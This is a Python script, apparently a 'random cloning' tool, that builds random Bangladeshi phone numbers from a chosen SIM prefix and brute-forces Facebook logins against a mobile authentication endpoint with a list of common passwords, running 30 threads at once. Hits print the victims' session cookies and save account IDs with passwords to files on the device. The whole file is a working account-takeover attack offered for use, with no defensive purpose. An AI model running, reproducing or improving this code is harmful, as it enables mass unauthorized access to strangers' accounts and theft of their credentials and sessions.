#WRITTEN BY MR.DEVIL
#FOLLOW : https://github.com/MrDevilEx
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate \033[0;34mby kalyan \033[0;32mvai...............')
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate \033[0;32mdone.............')
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mJOIN MY FACEBOOK GROUP............')
os.system('xdg-open https://facebook.com/groups/1036123894351028/') 
ip = requests.get("https://api.ipify.org").text
print("\t \033[0;97m[•] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip) 
print("\t \033[0;97m[•] \x1b[1;92m KALYAN-KiNG TRACK YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)       
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'kgf'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN KALYAN-KGF TOOL SUCCESSFULLY') 
            key = 'false'
#_________[ MAIN MENU ]______>>
#-------------logo-----------------#
logo=(f'''\33[1;92m██╗  ██╗ █████╗ ██╗  ██╗   ██╗ █████╗ ███╗   ██╗    
██║ ██╔╝██╔══██╗██║  ╚██╗ ██╔╝██╔══██╗████╗  ██║    
█████╔╝ ███████║██║   ╚████╔╝ ███████║██╔██╗ ██║    
██╔═██╗ ██╔══██║██║    ╚██╔╝  ██╔══██║██║╚██╗██║    
██║  ██╗██║  ██║███████╗██║   ██║  ██║██║ ╚████║    
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     
┏━━━━━━━━━━━━━━━━━━━°❀•°:🎀💚🎀:°•❀°━━━━━━━━━━━━━━━━━━━┓
       \x1b[38;5;46m⊰᯽⊱┈╌❊✶⊶⊷⊶⊷❍⊰᯽⊱┈──╌❊KALYANᎨ❊╌┈⊰᯽⊱❍⊶⊷⊶⊷✶❊╌──┈⊰᯽⊱
 \033[1;31m[\033[31;1m[M]\033[1;31m]\033[1;32m Facebook page : \033[38;5;46mFF GAMER 20
 \033[1;31m[\033[30;1m[E]\033[1;31m]\033[1;32m DEVELOPER : \x1b[38;5;196m KALYAN-KGF
 \033[1;31m[\033[33;1m[H]\033[1;31m]\033[1;32m FACEBOOK  : \033[38;5;46mKALYAN- king 
 \033[1;31m[\033[34;1m[E]\033[1;31m]\033[1;32m GITHUB    : \x1b[38;5;196mFUK
 \033[1;31m[\033[35;1m[D]\033[1;31m]\033[1;32m TOOLS     : \033[34;1mRANDOM CLONING 
 \033[1;31m[\033[37;1m[I]\033[1;31m]\033[1;32m VERSION   : \x1b[38;5;196mFREE\033[38;5;46m[V-3.02]
        \x1b[38;5;46m⊰᯽⊱┈╌❊✶⊶⊷⊶⊷❍⊰᯽⊱┈──╌❊KALYANᎨ❊╌┈⊰᯽⊱❍⊶⊷⊶⊷✶❊╌──┈⊰᯽⊱\x1b[1;92
┗━━━━━━━━━━━━━━━━━━━°❀•°:🎀💚🎀:°•❀°━━━━━━━━━━━━━━━━━━━┛''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_DEVIL():
    clear()
    os.system('xdg-open https://facebook.com/groups/1036123894351028/')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as DEVIL:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','708090','203040','506070','ayesha','Bangladesh','jannat','i love you','sumaiya','sadiya','jannat123','sadjjad','tanjila','tanvir','ujjal@@','nupur123','shadin','tanjila','rubel123','toufik@@','minhaj','taniya','freefire','free fire','santa123','jibon123','fahim@@','fahim123','sujal@@','tonmoy','mehedi123','masum@@','hannan']
            DEVIL.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_DEVIL()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[KALYAN-KGF] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/   avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;     v=b3;  q=0.7',
    'accept-language': 'en-GB,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'dpr': '1.5625',
    'referer': 'https://developers.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v=     "124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2111"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
            url='https://m.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[KALYAN-KGF-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/KALYAN-KGF-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[KALYAN-KGF-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/KALYAN-KGF-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
MR_DEVIL()